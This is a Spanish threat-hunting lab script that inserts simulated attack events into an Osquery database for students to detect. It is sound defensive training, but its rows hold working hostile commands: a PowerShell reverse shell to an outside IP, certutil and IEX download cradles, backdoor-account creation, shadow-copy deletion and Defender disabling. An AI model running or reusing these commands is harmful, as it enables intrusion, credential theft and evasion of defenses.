#!/usr/bin/env python3
"""
attack_simulator.py - Simula ataques en vivo insertando eventos en la BD de Osquery.
El estudiante ejecuta `simulate <escenario>` y los eventos aparecen en las tablas
para ser detectados con queries de hunting.

Uso: simulate <escenario>
     simulate list        - Lista todos los escenarios disponibles
     simulate reset       - Reinicia la BD al estado original

Curso MAR404 - Clase 9 - Lab 17
"""
import sqlite3
import hashlib
import time
import sys
import random
import json

DB_PATH = "/app/osquery.db"

# Tiempo base para nuevos eventos (simula "ahora")
def now():
    return int(time.time())

SCENARIOS = {
    "dll_injection": {
        "name": "DLL Injection (T1055.001)",
        "description": "Simula un proceso que inyecta una DLL maliciosa en explorer.exe",
        "mitre": "T1055.001 - Process Injection: Dynamic-link Library Injection",
    },
    "ransomware": {
        "name": "Ransomware Execution (T1486)",
        "description": "Simula un proceso de cifrado masivo de archivos con nota de rescate",
        "mitre": "T1486 - Data Encrypted for Impact",
    },
    "credential_dump": {
        "name": "Credential Dumping via LSASS (T1003.001)",
        "description": "Simula acceso a lsass.exe para extracción de credenciales (Mimikatz-like)",
        "mitre": "T1003.001 - OS Credential Dumping: LSASS Memory",
    },
    "reverse_shell": {
        "name": "Reverse Shell (T1059.004)",
        "description": "Simula una conexión de reverse shell hacia un C2 externo",
        "mitre": "T1059.004 - Command and Scripting Interpreter: Unix Shell",
    },
    "lateral_movement": {
        "name": "Lateral Movement via PsExec (T1021.002)",
        "description": "Simula movimiento lateral usando PsExec hacia otro host de la red",
        "mitre": "T1021.002 - Remote Services: SMB/Windows Admin Shares",
    },
    "persistence_registry": {
        "name": "Persistence via Registry Run Key (T1547.001)",
        "description": "Simula la creación de persistencia mediante clave de registro Run",
        "mitre": "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys",
    },
    "persistence_schtask": {
        "name": "Persistence via Scheduled Task (T1053.005)",
        "description": "Simula creación de tarea programada para persistencia",
        "mitre": "T1053.005 - Scheduled Task/Job: Scheduled Task",
    },
    "lolbin_certutil": {
        "name": "LOLBin: certutil Download (T1105)",
        "description": "Simula uso de certutil.exe para descargar payload desde internet",
        "mitre": "T1105 - Ingress Tool Transfer + T1218 - System Binary Proxy Execution",
    },
    "lolbin_mshta": {
        "name": "LOLBin: mshta.exe HTA Execution (T1218.005)",
        "description": "Simula ejecución de HTA malicioso via mshta.exe",
        "mitre": "T1218.005 - System Binary Proxy Execution: Mshta",
    },
    "lolbin_wmic": {
        "name": "LOLBin: WMIC Remote Execution (T1047)",
        "description": "Simula ejecución remota via WMIC en otro host",
        "mitre": "T1047 - Windows Management Instrumentation",
    },
    "data_exfiltration": {
        "name": "Data Exfiltration via HTTPS (T1048.002)",
        "description": "Simula exfiltración de datos sensibles hacia servidor externo",
        "mitre": "T1048.002 - Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    },
    "fileless_powershell": {
        "name": "Fileless Malware: PowerShell In-Memory (T1059.001)",
        "description": "Simula ejecución de payload en memoria via PowerShell sin tocar disco",
        "mitre": "T1059.001 - Command and Scripting Interpreter: PowerShell",
    },
    "defender_disable": {
        "name": "Disable Windows Defender (T1562.001)",
        "description": "Simula la deshabilitación de Windows Defender via registro y PowerShell",
        "mitre": "T1562.001 - Impair Defenses: Disable or Modify Tools",
    },
    "process_hollowing": {
        "name": "Process Hollowing (T1055.012)",
        "description": "Simula process hollowing en svchost.exe legítimo",
        "mitre": "T1055.012 - Process Injection: Process Hollowing",
    },
    "dga_communication": {
        "name": "DGA C2 Communication (T1568.002)",
        "description": "Simula comunicación con dominios generados algorítmicamente (DGA)",
        "mitre": "T1568.002 - Dynamic Resolution: Domain Generation Algorithms",
    },
}


def simulate_dll_injection(conn):
    """Simula DLL Injection en explorer.exe"""
    c = conn.cursor()
    t = now()
    pid_injector = random.randint(11000, 11999)
    
    # Proceso inyector
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_injector, "injector.exe", r"C:\Users\analyst01\AppData\Roaming\injector.exe",
         f"injector.exe --target explorer.exe --dll C:\\Users\\Public\\evil.dll",
         2400, 1001, 1001, t, 32768, 0, 4, 0, "R"))
    
    # DLL maliciosa creada en disco
    c.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?,?)",
        (r"C:\Users\Public\evil.dll", "suspicious", "CREATED",
         "a1b2c3d4e5f6a1b2", hashlib.sha256(b"injected_dll_payload").hexdigest(),
         t, 65536, 1001, pid_injector))
    
    # Hash de la DLL
    c.execute("INSERT INTO hash VALUES (?,?,?,?)",
        (r"C:\Users\Public\evil.dll", "a1b2c3d4e5f6a1b2",
         hashlib.sha256(b"injected_dll_payload").hexdigest(),
         hashlib.sha1(b"injected_dll_payload").hexdigest()))
    
    # Evento de proceso
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_injector, r"C:\Users\analyst01\AppData\Roaming\injector.exe",
         f"injector.exe --target explorer.exe --dll C:\\Users\\Public\\evil.dll",
         2400, r"C:\Windows\explorer.exe", "exec", t, 1001))
    
    # Conexión de red desde explorer (ahora inyectado)
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (2400, 30, 300, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         "185.220.101.45", 443, "ESTABLISHED"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: DLL Injection")
    print(f"    Proceso inyector PID: {pid_injector}")
    print(f"    Target: explorer.exe (PID 2400)")
    print(f"    DLL: C:\\Users\\Public\\evil.dll")
    print(f"    Timestamp: {t}")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar procesos desde AppData\\Roaming")
    print(f"    2. Buscar file_events con categoría 'suspicious' y extensión .dll")
    print(f"    3. Verificar conexiones de red de explorer.exe (normalmente no tiene)")
    print(f"    4. Buscar en process_events el proceso inyector")


def simulate_ransomware(conn):
    """Simula actividad de ransomware"""
    c = conn.cursor()
    t = now()
    pid_ransom = random.randint(12000, 12999)
    
    # Proceso ransomware
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_ransom, "svchost.exe", r"C:\ProgramData\svchost.exe",
         "svchost.exe --encrypt --key RSA2048",
         8100, 0, 0, t, 131072, 1, 16, 0, "R"))
    
    # Evento de proceso
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_ransom, r"C:\ProgramData\svchost.exe", "svchost.exe --encrypt --key RSA2048",
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    # Archivos cifrados masivamente
    extensions = [".docx", ".xlsx", ".pdf", ".jpg", ".pptx", ".sql", ".bak"]
    folders = [r"C:\Users\analyst01\Documents", r"C:\Users\analyst01\Desktop",
               r"C:\Shares\Finance", r"C:\Shares\HR"]
    
    for i in range(20):
        folder = random.choice(folders)
        ext = random.choice(extensions)
        filename = f"file_{i:03d}{ext}.locked"
        c.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?,?)",
            (f"{folder}\\{filename}", "ransomware", "CREATED", "", "",
             t + i, random.randint(1000, 5000000), 0, pid_ransom))
    
    # Nota de rescate
    c.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?,?)",
        (r"C:\Users\analyst01\Desktop\README_DECRYPT.txt", "ransomware", "CREATED",
         "", "", t + 21, 2048, 0, pid_ransom))
    
    # Intento de borrar shadow copies
    pid_vssadmin = random.randint(13000, 13999)
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_vssadmin, "vssadmin.exe", r"C:\Windows\System32\vssadmin.exe",
         "vssadmin.exe delete shadows /all /quiet",
         pid_ransom, 0, 0, t+22, 4096, 1, 1, 0, "S"))
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_vssadmin, r"C:\Windows\System32\vssadmin.exe",
         "vssadmin.exe delete shadows /all /quiet",
         pid_ransom, r"C:\ProgramData\svchost.exe", "exec", t+22, 0))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Ransomware")
    print(f"    Proceso cifrador PID: {pid_ransom}")
    print(f"    Archivos cifrados: 20 (extensión .locked)")
    print(f"    Nota de rescate: README_DECRYPT.txt")
    print(f"    Shadow copies eliminadas: vssadmin.exe (PID {pid_vssadmin})")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar procesos desde C:\\ProgramData con argumentos de cifrado")
    print(f"    2. Buscar file_events con categoría 'ransomware' o extensión .locked")
    print(f"    3. Detectar ejecución de vssadmin.exe delete shadows")
    print(f"    4. Buscar creación masiva de archivos en corto período")


def simulate_credential_dump(conn):
    """Simula credential dumping via acceso a LSASS"""
    c = conn.cursor()
    t = now()
    pid_dump = random.randint(14000, 14999)
    
    # Proceso mimikatz-like
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_dump, "taskmgr.exe", r"C:\Windows\Temp\taskmgr.exe",
         "taskmgr.exe sekurlsa::logonpasswords",
         8100, 0, 0, t, 65536, 1, 6, 0, "R"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_dump, r"C:\Windows\Temp\taskmgr.exe", "taskmgr.exe sekurlsa::logonpasswords",
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    # Archivo de dump creado
    c.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?,?)",
        (r"C:\Windows\Temp\lsass.dmp", "credential_dump", "CREATED",
         hashlib.md5(b"lsass_dump").hexdigest(), hashlib.sha256(b"lsass_dump").hexdigest(),
         t+1, 67108864, 0, pid_dump))
    
    # Hash del "mimikatz" renombrado
    c.execute("INSERT INTO hash VALUES (?,?,?,?)",
        (r"C:\Windows\Temp\taskmgr.exe", hashlib.md5(b"mimikatz_2.2.0").hexdigest(),
         hashlib.sha256(b"mimikatz_2.2.0").hexdigest(),
         hashlib.sha1(b"mimikatz_2.2.0").hexdigest()))
    
    # Conexión para exfiltrar credenciales
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (pid_dump, 40, 400, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         "198.51.100.10", 443, "ESTABLISHED"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Credential Dumping (LSASS)")
    print(f"    Proceso (mimikatz renombrado) PID: {pid_dump}")
    print(f"    Nombre falso: taskmgr.exe (desde C:\\Windows\\Temp)")
    print(f"    Dump creado: C:\\Windows\\Temp\\lsass.dmp (64MB)")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar procesos con nombre legítimo desde path inusual (Temp)")
    print(f"    2. Buscar file_events con categoría 'credential_dump'")
    print(f"    3. Buscar archivos .dmp en directorios temporales")
    print(f"    4. Verificar hash del ejecutable contra known-bad")


def simulate_reverse_shell(conn):
    """Simula reverse shell"""
    c = conn.cursor()
    t = now()
    pid_shell = random.randint(15000, 15999)
    c2_ip = "45.33.32.156"
    c2_port = 4443
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_shell, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         f"powershell.exe -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{c2_ip}',{c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"",
         2400, 1001, 1001, t, 45056, 0, 3, 0, "R"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_shell, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         f"powershell.exe -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{c2_ip}',{c2_port})...\"",
         2400, r"C:\Windows\explorer.exe", "exec", t, 1001))
    
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (pid_shell, 50, 500, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         c2_ip, c2_port, "ESTABLISHED"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Reverse Shell")
    print(f"    Proceso PID: {pid_shell}")
    print(f"    C2: {c2_ip}:{c2_port}")
    print(f"    Método: PowerShell TCP Socket")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar PowerShell con TCPClient en cmdline")
    print(f"    2. Buscar conexiones salientes a puertos no estándar (4443)")
    print(f"    3. Verificar procesos con cmdline extremadamente largo")
    print(f"    4. Buscar en process_events PowerShell lanzado desde explorer")


def simulate_lateral_movement(conn):
    """Simula lateral movement via PsExec"""
    c = conn.cursor()
    t = now()
    pid_psexec = random.randint(16000, 16999)
    target = "10.0.1.100"
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_psexec, "PsExec.exe", r"C:\Windows\Temp\PsExec.exe",
         f"PsExec.exe \\\\{target} -u admin -p P@ssw0rd123 cmd.exe /c whoami",
         8100, 0, 0, t, 16384, 1, 3, 0, "R"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_psexec, r"C:\Windows\Temp\PsExec.exe",
         f"PsExec.exe \\\\{target} -u admin -p P@ssw0rd123 cmd.exe /c whoami",
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    # Conexiones SMB al target
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (pid_psexec, 60, 600, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         target, 445, "ESTABLISHED"))
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (pid_psexec, 61, 601, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         target, 135, "ESTABLISHED"))
    
    # Hash de PsExec
    c.execute("INSERT INTO hash VALUES (?,?,?,?)",
        (r"C:\Windows\Temp\PsExec.exe", hashlib.md5(b"psexec_sysinternals").hexdigest(),
         hashlib.sha256(b"psexec_sysinternals").hexdigest(),
         hashlib.sha1(b"psexec_sysinternals").hexdigest()))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Lateral Movement (PsExec)")
    print(f"    Proceso PID: {pid_psexec}")
    print(f"    Target: {target}")
    print(f"    Credenciales en cmdline: admin / P@ssw0rd123")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar PsExec.exe en paths inusuales (Temp)")
    print(f"    2. Buscar conexiones SMB (445) hacia hosts internos")
    print(f"    3. Detectar credenciales en texto plano en cmdline")
    print(f"    4. Buscar process_events con parent sospechoso")


def simulate_persistence_registry(conn):
    """Simula persistencia via registro"""
    c = conn.cursor()
    t = now()
    pid_reg = random.randint(17000, 17999)
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_reg, "reg.exe", r"C:\Windows\System32\reg.exe",
         r'reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\updater.exe" /f',
         8100, 0, 0, t, 4096, 1, 1, 0, "S"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_reg, r"C:\Windows\System32\reg.exe",
         r'reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\updater.exe" /f',
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    c.execute("INSERT INTO registry VALUES (?,?,?,?,?)",
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
         "SecurityUpdate", "REG_SZ", r"C:\Users\Public\updater.exe", t))
    
    c.execute("INSERT INTO startup_items VALUES (?,?,?,?,?)",
        ("SecurityUpdate", r"C:\Users\Public\updater.exe", "registry_run", "enabled", "SYSTEM"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Persistence via Registry Run Key")
    print(f"    Proceso reg.exe PID: {pid_reg}")
    print(f"    Key: HKLM\\...\\Run\\SecurityUpdate")
    print(f"    Value: C:\\Users\\Public\\updater.exe")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar en registry tabla las claves Run modificadas recientemente")
    print(f"    2. Buscar startup_items con paths en Users\\Public")
    print(f"    3. Buscar process_events con reg.exe y 'CurrentVersion\\Run'")
    print(f"    4. Correlacionar con hash de updater.exe")


def simulate_persistence_schtask(conn):
    """Simula persistencia via scheduled task"""
    c = conn.cursor()
    t = now()
    pid_schtask = random.randint(18000, 18999)
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_schtask, "schtasks.exe", r"C:\Windows\System32\schtasks.exe",
         r'schtasks.exe /create /tn "MicrosoftEdgeUpdateCore" /tr "C:\Users\Public\updater.exe" /sc ONLOGON /ru SYSTEM /f',
         8100, 0, 0, t, 4096, 1, 1, 0, "S"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_schtask, r"C:\Windows\System32\schtasks.exe",
         r'schtasks.exe /create /tn "MicrosoftEdgeUpdateCore" /tr "C:\Users\Public\updater.exe" /sc ONLOGON /ru SYSTEM /f',
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    c.execute("INSERT INTO scheduled_tasks VALUES (?,?,?,?,?,?,?,?)",
        ("MicrosoftEdgeUpdateCore", r"C:\Users\Public\updater.exe",
         r"\Microsoft\EdgeUpdate", 1, t, t+86400, 0, "SYSTEM"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Persistence via Scheduled Task")
    print(f"    Proceso schtasks.exe PID: {pid_schtask}")
    print(f"    Task: MicrosoftEdgeUpdateCore")
    print(f"    Action: C:\\Users\\Public\\updater.exe")
    print(f"    Trigger: ONLOGON como SYSTEM")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar scheduled_tasks con acciones desde Users\\Public")
    print(f"    2. Buscar process_events con schtasks.exe /create")
    print(f"    3. Verificar tareas que corren como SYSTEM pero ejecutan binarios de usuario")
    print(f"    4. Buscar nombres que imitan software legítimo (Edge)")


def simulate_lolbin_certutil(conn):
    """Simula descarga via certutil"""
    c = conn.cursor()
    t = now()
    pid_cert = random.randint(19000, 19999)
    url = "http://evil-cdn.com/stage2.exe"
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_cert, "certutil.exe", r"C:\Windows\System32\certutil.exe",
         f"certutil.exe -urlcache -split -f {url} C:\\Windows\\Temp\\stage2.exe",
         8100, 0, 0, t, 8192, 1, 2, 0, "S"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_cert, r"C:\Windows\System32\certutil.exe",
         f"certutil.exe -urlcache -split -f {url} C:\\Windows\\Temp\\stage2.exe",
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    c.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?,?)",
        (r"C:\Windows\Temp\stage2.exe", "download", "CREATED",
         hashlib.md5(b"stage2_payload").hexdigest(),
         hashlib.sha256(b"stage2_payload").hexdigest(), t+2, 524288, 0, pid_cert))
    
    c.execute("INSERT INTO dns_cache VALUES (?,?,?,?,?)",
        ("evil-cdn.com", "A", "185.141.25.100", 60, t))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: LOLBin certutil Download")
    print(f"    Proceso PID: {pid_cert}")
    print(f"    URL: {url}")
    print(f"    Destino: C:\\Windows\\Temp\\stage2.exe")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar certutil.exe con -urlcache en cmdline")
    print(f"    2. Buscar file_events con categoría 'download' en Temp")
    print(f"    3. Verificar dns_cache para dominios sospechosos")
    print(f"    4. Correlacionar timestamp de DNS con file_events")


def simulate_lolbin_mshta(conn):
    """Simula ejecución de HTA via mshta"""
    c = conn.cursor()
    t = now()
    pid_mshta = random.randint(20000, 20999)
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_mshta, "mshta.exe", r"C:\Windows\System32\mshta.exe",
         "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -e JABjAD0...\"\", 0:close\")",
         2400, 1001, 1001, t, 16384, 0, 3, 0, "R"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_mshta, r"C:\Windows\System32\mshta.exe",
         "mshta.exe vbscript:Execute(...)",
         2400, r"C:\Windows\explorer.exe", "exec", t, 1001))
    
    # mshta spawns PowerShell
    pid_ps = random.randint(21000, 21999)
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_ps, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell.exe -ep bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
         pid_mshta, 1001, 1001, t+1, 45056, 0, 4, 0, "R"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_ps, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell.exe -ep bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
         pid_mshta, r"C:\Windows\System32\mshta.exe", "exec", t+1, 1001))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: LOLBin mshta.exe")
    print(f"    mshta PID: {pid_mshta}")
    print(f"    PowerShell hijo PID: {pid_ps}")
    print(f"    Método: VBScript inline → PowerShell encoded")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar mshta.exe con vbscript: en cmdline")
    print(f"    2. Buscar relación padre-hijo mshta → powershell")
    print(f"    3. Detectar PowerShell con -e (encoded) lanzado desde mshta")
    print(f"    4. Verificar process_events para la cadena completa")


def simulate_lolbin_wmic(conn):
    """Simula ejecución remota via WMIC"""
    c = conn.cursor()
    t = now()
    pid_wmic = random.randint(22000, 22999)
    target = "10.0.1.150"
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_wmic, "WMIC.exe", r"C:\Windows\System32\wbem\WMIC.exe",
         f"wmic /node:{target} process call create \"cmd.exe /c net user backdoor P@ss123! /add && net localgroup administrators backdoor /add\"",
         8100, 0, 0, t, 8192, 1, 2, 0, "S"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_wmic, r"C:\Windows\System32\wbem\WMIC.exe",
         f"wmic /node:{target} process call create \"cmd.exe /c net user backdoor P@ss123! /add\"",
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (pid_wmic, 70, 700, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         target, 135, "ESTABLISHED"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: LOLBin WMIC Remote Execution")
    print(f"    Proceso PID: {pid_wmic}")
    print(f"    Target: {target}")
    print(f"    Acción: Crear usuario backdoor con privilegios admin")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar WMIC.exe con /node: en cmdline")
    print(f"    2. Buscar 'net user' y 'net localgroup' en cmdline")
    print(f"    3. Detectar conexiones WMI (135) hacia hosts internos")
    print(f"    4. Correlacionar con process_events para ver la cadena")


def simulate_data_exfiltration(conn):
    """Simula exfiltración de datos"""
    c = conn.cursor()
    t = now()
    pid_exfil = random.randint(23000, 23999)
    
    # Proceso de staging
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_exfil, "7z.exe", r"C:\Windows\Temp\7z.exe",
         r"7z.exe a C:\Windows\Temp\data.7z C:\Users\analyst01\Documents\*.xlsx C:\Users\analyst01\Documents\*.pdf -pInfected123",
         8100, 0, 0, t, 32768, 1, 4, 0, "R"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_exfil, r"C:\Windows\Temp\7z.exe",
         r"7z.exe a C:\Windows\Temp\data.7z ... -pInfected123",
         8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", t, 0))
    
    # Archivo comprimido creado
    c.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?,?)",
        (r"C:\Windows\Temp\data.7z", "exfiltration", "CREATED",
         hashlib.md5(b"staged_data").hexdigest(), hashlib.sha256(b"staged_data").hexdigest(),
         t+5, 52428800, 0, pid_exfil))  # 50MB
    
    # Conexión de exfiltración
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (8100, 80, 800, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         "mega.nz", 443, "ESTABLISHED"))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Data Exfiltration")
    print(f"    Proceso staging PID: {pid_exfil}")
    print(f"    Archivo: C:\\Windows\\Temp\\data.7z (50MB, password-protected)")
    print(f"    Destino: mega.nz (cloud storage)")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar 7z/rar/zip desde paths inusuales (Temp)")
    print(f"    2. Buscar file_events con categoría 'exfiltration' y tamaño grande")
    print(f"    3. Detectar conexiones a servicios de cloud storage")
    print(f"    4. Buscar archivos con contraseña (-p flag) en cmdline")


def simulate_fileless_powershell(conn):
    """Simula fileless malware via PowerShell"""
    c = conn.cursor()
    t = now()
    pid_ps = random.randint(24000, 24999)
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_ps, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.10/amsi-bypass.ps1'); IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.10/invoke-mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
         2400, 1001, 1001, t, 262144, 0, 8, 0, "R"))
    
    c.execute("INSERT INTO process_events (pid, path, cmdline, parent, parent_path, action, time, uid) VALUES (?,?,?,?,?,?,?,?)",
        (pid_ps, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(...)\"",
         2400, r"C:\Windows\explorer.exe", "exec", t, 1001))
    
    c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)",
        (pid_ps, 90, 900, 2, 6, "10.0.1.50", random.randint(50000, 60000),
         "198.51.100.10", 80, "CLOSE_WAIT"))
    
    # DNS queries
    c.execute("INSERT INTO dns_cache VALUES (?,?,?,?,?)",
        ("198.51.100.10", "A", "198.51.100.10", 0, t))
    
    conn.commit()
    print(f"\n[!] ATAQUE SIMULADO: Fileless PowerShell (In-Memory)")
    print(f"    Proceso PID: {pid_ps}")
    print(f"    Método: IEX + DownloadString (cradle)")
    print(f"    Payload: AMSI bypass + Invoke-Mimikatz")
    print(f"    Nota: NADA se escribió en disco")
    print(f"\n[*] PISTAS PARA HUNTING:")
    print(f"    1. Buscar PowerShell con IEX o DownloadString en cmdline")
    print(f"    2. Buscar -nop -w hidden (flags de evasión)")
    print(f"    3. Detectar conexiones HTTP (80) desde PowerShell")
    print(f"    4. Buscar resident_size anormalmente alto (payload en memoria)")


def simulate_defender_disable(conn):
    """Simula deshabilitación de Windows Defender"""
    c = conn.cursor()
    t = now()
    pid_disable = random.randint(25000, 25999)
    
    c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (pid_disable, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1",
         8100, 0, 0, t, 45056, 1, 3, 0, "S"))
    
